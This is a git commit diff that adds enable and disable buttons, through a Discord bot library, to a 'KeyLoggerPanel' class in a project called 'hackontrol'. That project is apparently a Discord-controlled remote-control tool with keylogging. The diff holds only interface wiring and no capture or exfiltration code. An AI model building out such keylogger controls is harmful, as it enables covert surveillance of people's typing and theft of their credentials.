e213b04ca0367a3e50941dd8801a1841b0d4b70a
KHOPAN <puthipnakchan@gmail.com>
2024-07-05 20:06:00 +0700

    Add enable/disable button

--- src/com/khopan/hackontrol/panel/KeyLoggerPanel.java
+++ src/com/khopan/hackontrol/panel/KeyLoggerPanel.java
@@ -1,7 +1,15 @@
 package com.khopan.hackontrol.panel;
 
+import com.khopan.hackontrol.service.interaction.ButtonManager;
+import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
+
+import net.dv8tion.jda.api.interactions.components.buttons.Button;
+
 public class KeyLoggerPanel extends Panel {
 	private static final String PANEL_NAME = "keylogger";
+
+	private static final Button BUTTON_ENABLE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerEnable");
+	private static final Button BUTTON_DISABLE = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerDisable");
 
 	@Override
 	public String panelName() {
@@ -16,7 +24,9 @@ public class KeyLoggerPanel extends Panel {
 	@Override
 	public ControlWidget[] controlWidget() {
 		return new ControlWidget[] {
-
+				ControlWidget.newBuilder()
+				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
+				.build()
 		};
 	}
 }
